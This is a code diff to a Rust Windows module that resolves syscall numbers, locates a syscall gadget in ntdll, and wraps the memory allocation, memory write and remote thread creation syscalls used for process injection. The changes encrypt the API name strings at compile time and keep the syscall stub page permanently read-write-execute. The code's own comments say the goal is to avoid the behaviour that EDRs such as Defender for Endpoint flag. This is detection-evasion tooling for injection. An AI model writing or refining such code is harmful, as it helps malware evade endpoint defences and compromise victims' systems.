@@ -16,6 +16,8 @@ pub mod win {
     use std::ffi::{c_void, CString};
     use std::ptr;
     use std::mem;
+    use crate::strcrypt_rt;
+    use strcrypt::aes_str;
 
     extern "system" {
         fn GetModuleHandleA(name: *const i8) -> *mut c_void;
@@ -60,7 +62,8 @@ pub mod win {
     }
 
     unsafe fn resolve_ssn_uncached(func_name: &str) -> Option<u32> {
-        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
+        let ntdll_name = CString::new(aes_str!("ntdll.dll")).unwrap();
+        let ntdll = GetModuleHandleA(ntdll_name.as_ptr());
         if ntdll.is_null() { return None; }
 
         let cname = CString::new(func_name).ok()?;
@@ -218,7 +221,8 @@ pub mod win {
     }
 
     unsafe fn find_syscall_gadget_uncached() -> Option<*const u8> {
-        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
+        let ntdll_name = CString::new(aes_str!("ntdll.dll")).unwrap();
+        let ntdll = GetModuleHandleA(ntdll_name.as_ptr());
         if ntdll.is_null() { return None; }
 
         // Parse PE headers to find .text section
@@ -277,7 +281,7 @@ pub mod win {
         protect: u32,
         indirect: bool,
     ) -> i32 {
-        let ssn = match get_syscall_number("NtAllocateVirtualMemory") {
+        let ssn = match get_syscall_number(&aes_str!("NtAllocateVirtualMemory")) {
             Some(n) => n,
             None => return -1,
         };
@@ -307,7 +311,7 @@ pub mod win {
         old_protect: *mut u32,
         indirect: bool,
     ) -> i32 {
-        let ssn = match get_syscall_number("NtProtectVirtualMemory") {
+        let ssn = match get_syscall_number(&aes_str!("NtProtectVirtualMemory")) {
             Some(n) => n,
             None => return -1,
         };
@@ -329,7 +333,7 @@ pub mod win {
         bytes_written: *mut usize,
         indirect: bool,
     ) -> i32 {
-        let ssn = match get_syscall_number("NtWriteVirtualMemory") {
+        let ssn = match get_syscall_number(&aes_str!("NtWriteVirtualMemory")) {
             Some(n) => n,
             None => return -1,
         };
@@ -353,7 +357,7 @@ pub mod win {
         flags: u32,
         indirect: bool,
     ) -> i32 {
-        let ssn = match get_syscall_number("NtCreateThreadEx") {
+        let ssn = match get_syscall_number(&aes_str!("NtCreateThreadEx")) {
             Some(n) => n,
             None => return -1,
         };
@@ -409,15 +413,19 @@ pub mod win {
         extern "system" {
             fn VirtualAlloc(addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void;
         }
+        // OS page size - fixed by the architecture, not a tunable.
         const PAGE_SIZE: usize = 4096;
         // Allocate as RWX once at init and never call VirtualProtect again.
         // The old approach flipped RW->RX->RW on EVERY syscall - rapid memory
         // protection toggling on the same page is a classic shellcode indicator
         // that EDRs like Defender for Endpoint aggressively flag.
-        const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+        // Allocation/protection flags come from the typed FFI config
+        // (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE).
+        let ffi = &crate::config::config().ffi_windows;
         *STUB.get_or_init(|| {
             unsafe {
-                let p = VirtualAlloc(ptr::null_mut(), PAGE_SIZE, 0x3000, PAGE_EXECUTE_READWRITE);
+                let p = VirtualAlloc(ptr::null_mut(), PAGE_SIZE,
+                    ffi.mem_commit | ffi.mem_reserve, ffi.page_execute_readwrite);
                 p as usize
             }
         }) as *mut c_void
@@ -439,8 +447,8 @@ pub mod win {
         extern "system" {
             fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
         }
-        const PAGE_READWRITE: u32 = 0x04;
-        const PAGE_EXECUTE_READ: u32 = 0x20;
+        // No protection flags needed here: the stub page stays RWX from
+        // init (see get_stub_page), so VirtualProtect is never re-called.
 
         let stub = get_stub_page();
         if stub.is_null() { return -1; }
